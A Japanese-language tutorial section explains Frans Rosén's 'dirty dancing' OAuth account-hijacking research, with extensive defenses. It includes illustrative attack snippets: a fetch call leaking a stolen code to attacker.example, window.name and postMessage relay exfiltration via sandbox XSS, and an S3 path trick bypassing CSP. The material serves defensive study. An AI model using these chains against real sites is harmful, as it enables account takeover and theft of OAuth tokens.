## Frans Rosén「dirty dancing」— postMessage 経由のコード/トークン漏洩

### この節で学ぶこと

OAuth の「認可コード横取り（account hijacking）」は、2012〜2013年ごろの Egor Homakov や Nir Goldshlager の研究以来、繰り返し議論されてきた古典的テーマです。しかし CSP（Content Security Policy）やブラウザの XSS Auditor、`postMessage` の origin 検証といった防御が普及した結果、多くの開発者は「もう安全」と思い込むようになりました。Frans Rosén（Detectify）の2022年の研究「Account hijacking using "dirty dancing" in sign-in OAuth-flows」は、この思い込みを打ち破り、**正規のログイン成功パス（happy path）ではなく、あえて OAuth フローを"途中で失敗させる"（非happy path）ことで、認可コードやトークンを URL に残留させ、それを `postMessage` などのブラウザ内ガジェットで盗み出す**という一連の手口を体系化しました。

本節では、この「dirty dancing（きわどいダンス）」がなぜ成立するのかを、OAuth のレスポンス種別・レスポンスモードの仕様レベルから、`postMessage` リスナーの実装バグまで、仕組みに踏み込んで解説します。

> ⚠️ **スコープの確認**: 本節は防御・検知の理解を目的として攻撃原理を説明します。実在するサービスや本番環境への無許可の検証は行わないでください。掲載するコードは「なぜ漏洩が起きるか」を理解するための最小の説明用断片です。

---

### なぜ「途中で失敗させる」と漏洩するのか — 前提となる直感

まず攻撃の全体像をつかみます。通常、被害者が正規サイトで「Google でログイン」を押すと、以下が起きます。

1. 正規サイトが認可サーバ（Google など）へ被害者を送る。
2. 被害者が同意（または既にセッションがあれば即座）。
3. 認可サーバが `code`（認可コード）や `token`（アクセストークン）を付けて、**正規サイトの `redirect_uri`** へ被害者を戻す。
4. 正規サイトのサーバがその `code` を受け取り、裏側でトークンに交換してログイン完了。

この「happy path」では、`code` は正規サイトのコールバックページに一瞬現れるだけで、すぐに消費（サーバサイドでトークン交換）されます。攻撃者が割り込む隙はほとんどありません。

「dirty dancing」の発想は、**この4のステップを"正常に完了させない"** ことです。たとえば `state`（後述）をわざと不正にすれば、正規サイトは「不正なリクエストだ」としてエラーページを表示します。ところが、そのエラーページの URL には **まだ `code` が残ったまま**であることが多い。もしそのエラーページ（あるいはコールバック直後のページ）に、origin 検証の甘い `postMessage` リスナーや、サードパーティ JavaScript（Google Tag Manager、チャットウィジェット、解析SDKなど）が読み込まれていれば、攻撃者はそれを"ガジェット"として悪用し、URL に残った `code`/`token` を自分のオリジンへ盗み出せます。

つまり dirty dancing は、次の2つの独立した要素を**連鎖（chain）** させる攻撃です。

- **(A) トークン/コードを URL に残留させる手口**（レスポンス種別/モードの切り替え、`state` の破壊、`redirect_uri` の細工）
- **(B) URL に残ったものをクロスオリジンで盗み出すガジェット**（弱い `postMessage` リスナー、サンドボックスドメインの XSS、帯域外のデータ漏洩経路）

以下、それぞれを詳しく見ます。

---

### 前提知識の整理: レスポンス種別（response_type）とレスポンスモード（response_mode）

dirty dancing を理解するには、OAuth/OpenID Connect の「何を返すか（response_type）」と「どこに返すか（response_mode）」の区別が要です。

#### response_type — 何が返るか

- **`code`**: 認可コード。単体では使えず、サーバがクライアントシークレット（や PKCE の `code_verifier`）と合わせてトークンに交換する必要がある。通常 `state` とセット。
- **`id_token`**: OpenID Connect の ID トークン。認可サーバが署名した JWT。
- **`token`**: アクセストークン本体。**URL に露出した瞬間に即悪用できる**ため最も危険。
- これらは `code id_token`、`code token` のように**組み合わせ**も可能（ハイブリッドフロー）。

#### response_mode — どこに（どの形式で）返るか

- **`query`**: `?code=...&state=...` のように URL のクエリ文字列に入る。サーバのアクセスログにも残る。仕様上 `token` を query で返すのは非推奨。
- **`fragment`**: `#access_token=...` のように URL のフラグメント（`#` 以降）に入る。フラグメントはブラウザからサーバへ送信されないため、`token` の配送に使われる。
- **`web_message`**: 認可サーバのページが `postMessage` で固定オリジンへ結果を送る方式（Auth0 等が採用）。
- **`form_post`**: 結果を `POST` ボディとしてサイトへ送り返す。

ここで攻撃者が狙うのは、**サイト（クライアント）が想定しているモードと違うモードを認可サーバに要求できてしまう**という設定不備です。たとえばサイトは `response_type=code`（query）でコールバックを処理する実装なのに、攻撃者がログイン開始 URL を書き換えて `response_type=code id_token`（fragment 配送）を要求できると、サイトのサーバは fragment を読めない（サーバに送られない）ため処理に失敗し、`code`/`id_token` がブラウザ側の URL に残ります。

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows" — https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/

---

### (A) トークン/コードを URL に残留させる5つの手口

Frans Rosén は「OAuth のダンスを崩す」非happy path を、次のように分類しました。

#### 1. 不正な state パラメータ（Invalid State）

`state` は「このコールバックは、確かに自分（正規サイト）が開始したログインの応答である」ことを保証するための、CSRF 対策用のランダム値です。サイトはログイン開始時に `state` を生成してセッションに保存し、コールバックで一致を確認します。

攻撃の流れ:

1. 攻撃者は**自分の環境で正規サイトにログイン開始**し、正規サイトが発行した有効な `state`（例: `STATE_ATT`）を手に入れる。
2. 攻撃者は被害者に踏ませるリンクを、`...&state=STATE_ATT` のように**攻撃者の state を仕込んで**作る。
3. 被害者がそのリンクを踏むと、被害者のブラウザで認可サーバが `code`（被害者の認可コード）を付けて `redirect_uri` に戻す。
4. しかしサイトは、被害者のセッションに保存した `state` と `STATE_ATT` が**一致しない**ためエラー扱いにする。
5. その結果、**エラーページの URL に被害者の `code` が残る**。
6. 攻撃者はガジェット（後述の (B)）でこの `code` を盗み、**自分側の `state`（と PKCE の対応する `code_verifier`）** で正規のフローを完了させ、被害者アカウントに成りすます。

**なぜ PKCE でも防げないのか**: PKCE（Proof Key for Code Exchange）は、ログイン開始時に `code_verifier`（ランダム秘密）を作り、そのハッシュ `code_challenge` を認可サーバに登録し、トークン交換時に `code_verifier` を提示させる仕組みです。「コードだけ盗んでも `code_verifier` がないと交換できない」ため強力に見えます。しかし dirty dancing では**攻撃者自身がフローを開始する**ため、攻撃者は自分の `code_challenge`/`code_verifier` のペアを用意でき、被害者の `code` はその攻撃者側チャレンジに紐づいた形で得られます。よって攻撃者は自分の `code_verifier` で交換できてしまい、PKCE は突破されます。ここは「PKCE を入れたから安心」という思い込みを崩す重要点です。

#### 2. レスポンス種別/モードの切り替え（Response-Type/Mode Switching）

前述の通り、サイトが `code`（query）で処理する前提なのに、攻撃者がログイン開始 URL を `response_type=code id_token` などに書き換えると、配送先が fragment に変わり、サーバが読めず URL に残留します。

記事では具体例として **Apple のサインイン**が挙げられています。Apple は本来 `response_mode=query` を使いますが、これを `fragment` に切り替えると、認証情報の出現位置がクエリからフラグメントへ移動します。想定と違うモードで返ることで、クライアント側の処理が破綻し、値が URL に取り残されます。

```
# サイトが想定する開始リクエスト（例）
https://appleid.apple.com/auth/authorize?...&response_type=code&response_mode=query

# 攻撃者が書き換えた開始リクエスト（例）
https://appleid.apple.com/auth/authorize?...&response_type=code&response_mode=fragment
```

**なぜ成立するか**: 認可サーバが、そのクライアントに対して許可するレスポンス種別/モードを**厳密に固定していない**（複数を許容している）と、攻撃者がクライアント登録の意図と異なるモードを"注文"できてしまうためです。

#### 3. redirect_uri のケースシフト（大文字小文字ずらし）

OAuth 仕様では `redirect_uri` は**完全一致**で検証すべきですが、一部プロバイダはパス部分を**大文字小文字を区別せず**照合してしまいます。

```
# 登録された正規のコールバック
https://example.com/callback

# 攻撃者が使う変形（一部プロバイダは同一とみなす）
https://example.com/CaLLbaCk
```

**なぜ漏洩に繋がるか**: 認可サーバは「一致した」とみなして `code`/`token` を返しますが、**サイト側のルーティングは `/CaLLbaCk` を正規のコールバックハンドラに解決しない**ことがあります。すると 404 やデフォルトのエラーページに着地し、そのページに `code` が残ったまま、かつ（コールバックと違って）サードパーティスクリプトが読み込まれている、という危険な組み合わせが生まれます。

#### 4. redirect_uri へのパス/パラメータ追記（Path/Parameter Appending）

一部プロバイダは、登録済み `redirect_uri` への**末尾追記**を許してしまいます。

```
# 例: パラメータをエンコードして追記
redirect_uri=https://example.com/callback%3Fcode=xxx%26
```

`%3F` は `?`、`%26` は `&` のエンコードです。これにより、返される URL に**重複したパラメータや不正な形の URL**が生まれ、サイトの処理が壊れる（＝正常消費されず URL に残る）一方で、認証情報は保持されます。パス追記（`/callback/x` など）でも同様に、ハンドラへの解決が外れてエラーページ着地→残留、という結果になります。

#### 5. redirect_uri の設定ミス（開始ページ自体が redirect_uri に登録）

Frans Rosén は **125個の Google サインインフロー**を調査し、そのうち **5サイト**が「ログイン開始ページ（スタートページ）そのもの」を有効な `redirect_uri` として登録していた、と報告しています。この設定だと、認可サーバはトークンを"予期しないエンドポイント（開始ページ）"へ配送でき、そこにコールバック処理が無いため値が残留します。

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows" — https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/

---

### (B) URL に残った値を盗み出す「ガジェット」

残留させただけでは攻撃は完成しません。攻撃者は自分のオリジン（悪性ページ）から、被害者のタブに残った `code`/`token` を読む必要があります。ブラウザの同一オリジンポリシーがあるため、通常は他オリジンの URL を直接読めません。そこで、正規サイト（や連携サードパーティ）の中に潜む**弱いブラウザ内メッセージング機構**を"梃子（ガジェット）"にします。

#### ガジェット1: 弱い postMessage リスナー

`postMessage` は、異なるオリジンの window（別タブや iframe）間でメッセージを送るブラウザ API です。**受信側は必ず `event.origin` を検証すべき**ですが、これを怠り「誰からのメッセージでも応答する」実装が、サードパーティ SDK に紛れ込んでいることがあります。

典型的には、SDK が「今いるページの URL（`location.href`）」を問い合わせに応じて返すような実装です。

```javascript
// 攻撃者ページ（悪性オリジン）側のコード
// window.open で被害者のタブ（残留 code を含む URL）を開く／参照を持つ
var openedwindow = window.open('https://www.example.com');

// origin 検証の甘い SDK リスナーに問い合わせを投げる（宛先 '*' = 任意オリジン）
openedwindow.postMessage('{"type":"sdk-load-embed"}', '*');

// SDK が「現在の location.href」を返信 → その中に ?code=... が入っている
window.addEventListener('message', function(e) {
  // e.data に被害者の URL（= code/token 付き）が届く
  fetch('https://attacker.example/leak?d=' + encodeURIComponent(e.data));
});
```

**なぜ成立するか**: `postMessage` の宛先に `'*'`（任意オリジン）を使うと、メッセージは指定なしで届きます。さらに**受信側 SDK が `event.origin` を確認せず**、要求に応じて機微情報（現在 URL）を返信してしまうと、攻撃者オリジンへ堂々とデータが渡ります。攻撃者は事前に (A) の手口で `code` を URL に残らせておき、このガジェットで回収します。

#### ガジェット2: サンドボックスドメイン上の XSS

サイトが「サンドボックス用（信頼しないコンテンツ表示用）」のサブドメインや iframe を持ち、そこに XSS があると、攻撃者はその内側から親/オープナー window を操作してデータを引き出せます。記事は2つの変種を示します。

**変種2A: `window.name` を使った持ち出し**

`window.name` は**ページ遷移をまたいで保持される**特殊なプロパティで、しかもクロスオリジンでも（一定の条件で）読み書きの経路になり得ます。親が iframe の `name` に機微データを詰め、その iframe 内で XSS が動くと、`window.name` 経由で吸い出せます。

```javascript
// 親（正規側）が iframe の name に window.location（= URL）を詰めてしまう例
var i = document.createElement('iframe');
i.name = JSON.stringify(window.location);      // ここに code/token 付き URL が入る
i.srcdoc = '<script>window.parent.postMessage(window.name, "*")<\/script>';

// 攻撃者はサンドボックスドメインの XSS からフレーム階層を辿り、name を読む
// 例: b.frames[0].window.name → 完全な URL（トークン入り）
```

**変種2B: XSS 経由の postMessage プロキシ**

サンドボックスオリジンで攻撃者が任意 JS を実行できると、その"信頼されたオリジン"を中継役にして、本来届かないメッセージを転送するプロキシを作れます。

```javascript
// 攻撃者がサンドボックスオリジンのフレームに仕込む中継コード
b.frames[1].eval(
  'onmessage=function(e){ top.opener.postMessage(e.data,"*") };' +  // 受けた物を opener へ横流し
  'top.postMessage({type:"initConfig"},"*")'                        // 上位に初期化を要求
);
// parent / opener の関係を辿ってデータを攻撃者へ漏らす
```

**なぜ成立するか**: `postMessage` の origin 検証がサイト全体で一貫していないと、"信頼できるオリジンから来たメッセージ"として素通りする経路が生まれます。攻撃者はサンドボックスドメインの XSS でその信頼を借用し、中継ノードを作って機微データを最終的に自オリジンへ運びます。

#### ガジェット3: 帯域外（out-of-band）のデータ漏洩

サードパーティのインフラ（解析ストレージ、CDN、チャットウィジェット）の設計不備を突く経路です。

**変種3A: 解析ストレージ iframe（origin 許可リストなし）**

複数サイトで共有される「同期用ストレージ iframe」が、`postMessage` の origin を検証せず購読を受け付けると、被害者の URL がストレージに書かれた瞬間に、購読している攻撃者へブロードキャストされます。

```javascript
// 脆弱な同期 iframe（origin 検証が甘い例）
window.addEventListener('message', function(e) {
  if (e.source !== window.parent) return;          // 親かどうかだけ確認（origin は未検証）
  if (e.data.type === 'sync') {
    syncListeners.push({ source: e.source, origin: e.origin });  // 誰でも購読可能
  }
});

// ストレージ更新（例: 被害者 URL が保存される）を全購読者へ配る
window.addEventListener('storage', function(e) {
  syncListeners.forEach(function(l) {
    l.source.postMessage({ type: 'sync', key: e.key, value: e.newValue }, l.origin);
  });
});
```

攻撃者はこのストレージ iframe を**自分のページの子として埋め込み**、同期購読を登録。被害者側でトークン入り URL が保存されると、その値が攻撃者へも配送されます。

**変種3B: S3/CDN の URL エンコード差異による XSS**

Amazon S3 はパス中の `/` と `%2f` を同一視することがあります。ここで「`/img/` パスには CSP ヘッダが付くが、`img%2f` には付かない」という設定差があると、CSP を回避して別顧客のオリジンで JS を実行できます。

```
# 顧客Aのオリジンで、顧客Bのバケットにアップした悪性 SVG を実行
https://cdn.customer-A.analytics.com/img%2fcustomer-B/xss.svg
```

**なぜ成立するか**: パス正規化（`%2f` の解釈）の食い違いにより、CSP を付与するルールにマッチしないパスで同一ファイルへ到達できてしまう。攻撃者は公開バケットに XSS を含む SVG を置き、別顧客のサブドメイン経由で読み込ませて、そのオリジンで JS を実行→origin 無検証の postMessage プロキシを構築します。

**変種3C: チャットウィジェット API**

チャットウィジェットの iframe が、origin 検証なしに親へ API トークンを渡すと、攻撃者はチャット起動をトリガーしてそのトークンを読み取り、被害者の `current_page`（トークン入り URL を含む）を API から取得できます。記事では、サーバサイドリクエストで `Origin` ヘッダを人工的に付けてチャット API をポーリングし、被害者セッションの情報を再構成する、という流れが説明されています。

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows" — https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/

---

### 攻撃の全体像（連鎖のまとめ）

dirty dancing は「(A) 残留 × (B) 漏洩ガジェット」の掛け算です。1クリックのアカウント乗っ取り（single-click account takeover）が成立する典型シナリオは次の通りです。

1. 攻撃者が自分の環境でログインを開始し、有効な `state` と PKCE ペアを用意する（1.）。
2. 攻撃者が `state` 差し替え／レスポンスモード切替／`redirect_uri` 細工を仕込んだログイン URL を作る（A）。
3. 被害者がその1本のリンクをクリック。被害者のブラウザで `code` が発行されるが、`state` 不一致等でエラーページ着地→**URL に `code` 残留**。
4. そのエラーページ/コールバック周辺に読み込まれた弱い postMessage リスナーやサードパーティ SDK（B）を使い、攻撃者オリジンが `code` を回収。
5. 攻撃者は自分の `state`／`code_verifier` で正規フローを完了させ、被害者アカウントに成りすます。

被害者の操作は「1回のクリック」だけで、以降のトークン窃取は自動化されます。攻撃者ページが被害者タブを制御し、クロスオリジンで機微情報を吸い出す点が本質です。

---

### 未取得資料の扱い（Speaker Deck スライド）

本節の元となったスライド（Speaker Deck）については WebFetch でテキスト抽出に成功し、記事本文と同一の主張（レスポンス種別/モード切替、`redirect_uri` の変形、`state` 検証破り、弱い postMessage リスナー、サードパーティドメインの XSS、API 列挙、そして「OAuth ダンスに関わるエラーページにサードパーティスクリプトを載せない」という中心的防御）を確認できました。特に強調されていた実務メッセージは以下です。

- 「OAuth ダンスに関わるエラーページにサードパーティスクリプトを含めるな（Do NOT include third party scripts on error pages involved in the OAuth-dance）」
- 非happy path を必ずテストし、GTM（Google Tag Manager）などのタグが OAuth フロー中に読み込まれていないか検証せよ
- `state` を厳格に検証せよ
- プロバイダ側は、使わないレスポンスモード/種別を無効化できるようにし、`redirect_uri` 検証をより厳格に、レスポンスモードのピン留め（固定）を実装せよ

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows"（スライド） — https://speakerdeck.com/fransrosen/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows

---

### 影響（Impact）

- **1クリックのアカウント乗っ取り**: 被害者はリンクを踏むだけ。以降は自動。
- **クロスオリジンでの被害者タブ制御**: 攻撃者ページが被害者の window を操作。
- **持続性**: OAuth プロバイダが発行した認証情報の性質上、条件が揃えば長期間にわたり悪用余地が残る。
- **PKCE を入れていても防げない**ケースがある（攻撃者がフローを開始する構造のため）。

---

### 防御（Defenses / Mitigations）

本研究の最大の教訓は、**OAuth のコールバックとエラーページを"清浄地帯（clean room）"に保て**、という点です。

#### OAuth クライアント（サイト）側

- **サードパーティスクリプトを OAuth 経路から排除する**。仕様の精神として「認可レスポンスの結果として描画されるページ（および認可エンドポイント）は、サードパーティのリソースや外部サイトへのリンクを含むべきでない（SHOULD NOT）」。これは**エラーページも含む**。
- **`state` を、`code` を消費する前に必ず検証する**。不一致なら `code` を含む URL を即座に無害化（リダイレクトで除去等）する。
- **対応するレスポンス種別/モードをプロバイダ設定で絞る**（想定外の `id_token`/`token`/fragment を受け付けない）。
- **プロバイダの `redirect_uri` 検証を過信しない**。自サイト側でもコールバックのパス/クエリを厳格に扱う。
- **非happy path（失敗系）を必ずテストする**。GTM やチャット、解析 SDK が OAuth フロー中に読み込まれていないか確認する。

#### OAuth プロバイダ側

- **`redirect_uri` を厳密な完全一致で検証する**（大文字小文字を区別、末尾追記を不許可）。
- **すべてのレスポンス種別で、最終的なトークン発行時に `redirect_uri` を検証する**。
- **アプリごとに使用可能なレスポンス種別/モードを制限**できるようにし、使わないモードは無効化可能にする（レスポンスモードのピン留め）。
- 各レスポンスモードのセキュリティ上の含意をドキュメント化する。

#### 一般的な多層防御

- **送信者制約付きアクセストークン（Sender-Constrained Access Tokens、mTLS など）** を使い、万一トークンが漏れても他者が使えないようにする。
- **CSP（Content Security Policy）** で postMessage ガジェットや不要な外部スクリプトの実行余地を狭める。
- サイトへのサードパーティスクリプト追加（GTM 経由の変更など）を監視する。
- OAuth ダンスに関わる**全ページ（エラー経路を含む）を棚卸し**して監査する。

---

### まとめ — 「happy path しか見ない」ことの危険

dirty dancing が突いたのは、技術的な単一のバグというより、**開発者の心理的死角**です。「CSP も PKCE も postMessage の origin 検証もある、だからもう安全」という前提のもとで、誰も「わざと失敗させたときのエラーページ」を見ていない。そこにサードパーティスクリプトがぶら下がり、URL に `code` が残る。攻撃者はその2つを繋ぐだけで1クリック乗っ取りに至ります。

教訓は明快です。**OAuth の安全性は happy path だけでなく、あらゆる失敗系（非happy path）と、そこに載っているすべてのサードパーティコードを含めて評価しなければならない**。認可コード/トークンが一瞬でも留まる URL は、それがエラーページであっても"機密"として扱う、というのが本研究の核心的な設計原則です。

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows"（Detectify Labs） — https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/
